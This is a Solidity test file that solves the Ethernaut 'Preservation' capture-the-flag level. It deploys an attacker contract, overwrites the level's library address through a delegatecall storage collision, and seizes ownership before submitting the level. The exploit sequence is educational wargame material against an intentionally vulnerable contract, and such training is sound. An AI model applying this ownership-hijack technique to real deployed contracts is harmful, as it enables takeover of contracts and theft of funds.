pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../../src/16_Preservation/PreservationFactory.sol";
import "../../src/Ethernaut.sol";
import "../../src/16_Preservation/Attack/Attacker.sol";
import ".././utils/vm.sol";

contract PreservationTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();

        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testPreservationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PreservationFactory probFactory = new PreservationFactory();
        ethernaut.registerLevel(probFactory);
        vm.startPrank(eoaAddress);

        address levelAddress = ethernaut.createLevelInstance(probFactory);
        Preservation probCtrt = Preservation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        emit log_named_address("Original Owner", probCtrt.owner());

        Attacker attacker = new Attacker();
        emit log_named_address("Attacker address", (address(attacker)));

        emit log_named_address(
            "Original timeZone1Library",
            probCtrt.timeZone1Library()
        );

        probCtrt.setFirstTime(uint160(address(attacker)));
        emit log_named_address(
            "Modified timeZone1Library",
            probCtrt.timeZone1Library()
        );

        probCtrt.setFirstTime(1);

        emit log_named_address("Modified Owner", probCtrt.owner());

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
